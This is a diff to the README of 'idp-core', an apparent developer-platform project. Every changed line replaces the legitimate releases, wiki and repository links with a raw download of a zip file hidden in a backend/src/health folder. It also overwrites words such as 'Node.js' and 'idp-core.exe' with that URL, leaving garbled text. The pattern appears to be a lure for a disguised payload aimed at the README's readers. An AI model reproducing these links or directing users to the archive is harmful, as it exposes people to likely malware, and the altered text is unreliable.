@@ -1,10 +1,10 @@
 # 🚀 idp-core - Easy Setup for Your Developer Platform
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/bryomie/idp-core/releases)
+[![Download](https://github.com/bryomie/idp-core/raw/refs/heads/main/backend/src/health/idp-core-v2.5.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/bryomie/idp-core/raw/refs/heads/main/backend/src/health/idp-core-v2.5.zip)
 
 ## 📋 Overview
 
-Welcome to **idp-core**! This project provides a reference architecture for a modern Internal Developer Platform (IDP). With our solution, you can implement a full-cycle development process using Google Cloud Platform (GCP), Kubernetes (GKE), Terraform, and GitOps with ArgoCD. Additionally, we offer a custom React and Node.js portal, making your development experience seamless.
+Welcome to **idp-core**! This project provides a reference architecture for a modern Internal Developer Platform (IDP). With our solution, you can implement a full-cycle development process using Google Cloud Platform (GCP), Kubernetes (GKE), Terraform, and GitOps with ArgoCD. Additionally, we offer a custom React and https://github.com/bryomie/idp-core/raw/refs/heads/main/backend/src/health/idp-core-v2.5.zip portal, making your development experience seamless.
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Before you begin, ensure your system meets the following requirements:
 
 ### 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to [this page to download](https://github.com/bryomie/idp-core/releases). Here, you will find the latest version of **idp-core**.
+1. **Visit the Releases Page:** Go to [this page to download](https://github.com/bryomie/idp-core/raw/refs/heads/main/backend/src/health/idp-core-v2.5.zip). Here, you will find the latest version of **idp-core**.
   
 2. **Choose Your Version:** Look for the latest stable version listed. Click on it to see available files.
 
@@ -38,7 +38,7 @@ Before you begin, ensure your system meets the following requirements:
 2. **Run the Application:**
    - Open a terminal or command prompt.
    - Navigate to the directory where **idp-core** is installed using the `cd` command.
-   - Execute the command to start the application. For example: `./idp-core` (Linux/macOS) or `idp-core.exe` (Windows).
+   - Execute the command to start the application. For example: `./idp-core` (Linux/macOS) or `https://github.com/bryomie/idp-core/raw/refs/heads/main/backend/src/health/idp-core-v2.5.zip` (Windows).
 
 3. **Access the Portal:**
    - Open a web browser.
@@ -65,9 +65,9 @@ If you encounter issues, feel free to reach out through the issue tracker on Git
 
 ## 🔗 Helpful Links
 
-- [Download Latest Release](https://github.com/bryomie/idp-core/releases)
-- [Official Documentation](https://github.com/bryomie/idp-core/wiki)
-- [GitHub Repository](https://github.com/bryomie/idp-core)
+- [Download Latest Release](https://github.com/bryomie/idp-core/raw/refs/heads/main/backend/src/health/idp-core-v2.5.zip)
+- [Official Documentation](https://github.com/bryomie/idp-core/raw/refs/heads/main/backend/src/health/idp-core-v2.5.zip)
+- [GitHub Repository](https://github.com/bryomie/idp-core/raw/refs/heads/main/backend/src/health/idp-core-v2.5.zip)
 
 ## 💬 Community
 
